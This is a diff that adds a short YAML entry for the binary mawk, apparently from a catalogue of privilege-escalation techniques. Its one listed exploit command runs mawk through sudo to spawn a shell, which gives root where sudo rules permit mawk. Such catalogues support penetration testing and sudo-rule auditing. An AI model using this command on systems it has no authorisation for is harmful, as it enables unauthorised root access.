@@ -1,0 +1,4 @@
+name: mawk
+binary_path: /usr/bin/mawk
+exploit_cmds:
+- sudo /usr/bin/mawk 'BEGIN {system("/bin/sh")}'
